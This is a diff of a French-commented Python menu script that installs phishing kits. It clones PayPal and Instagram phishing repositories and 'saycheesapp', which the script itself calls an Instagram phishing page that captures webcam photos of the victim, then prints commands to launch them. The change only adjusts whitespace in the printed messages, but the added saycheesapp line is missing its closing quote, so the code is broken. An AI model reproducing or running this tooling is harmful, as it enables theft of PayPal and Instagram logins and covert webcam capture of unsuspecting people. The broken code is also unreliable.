@@ -73,15 +73,15 @@ while on_off:
 				os.system("git clone https://github.com/thelinuxproject/paypal tools/paypal")#	installation de paypal
 				os.system("clear")
 				println(7)
-				print("operation terminer...\nCommandes pour utiliser instagram :\n •cd tools/insatgram\n•bash instagram.sh")
-				print("\nCommandes pour utiliser paypal :\n •cd tools/paypal\n•bash paypal.sh")
+				print("operation terminer...\nCommandes pour utiliser instagram :\n	•cd tools/insatgram\n	•bash instagram.sh")
+				print("\nCommandes pour utiliser paypal :\n	•cd tools/paypal\n	•bash paypal.sh")
 				sleep(6)#														attente de 4seconde	
 			elif userChoise_tools == "2":#										choix n°1 pour istaller les outils de phishing
 				os.system("mkdir tools")
 				os.system("git clone https://github.com/thelinuxproject/saycheesapp tools/saycheesapp")#	installation de saycheesapp 
 				os.system("clear")
 				println(7)
-				print("operation terminer...\nsaycheesapp est une version phishing de instagrm (avec des photo de la webcam de votre victim)\n	Commandes pour l'utiliser :\n •cd tools/saycheesapp\n•bash saycheesapp.sh")
+				print("operation terminer...\nsaycheesapp est une version phishing de instagrm (avec des photo de la webcam de votre victim)\n	Commandes pour l'utiliser :\n	•cd tools/saycheesapp\n	•bash saycheesapp.sh)
 				sleep(6)#
 			elif userChoise_tools == "4":#										choix n°4 pour quitter le choi de téléchargement des des depots
 				userChoise = "0"#												retour au menu userchoice
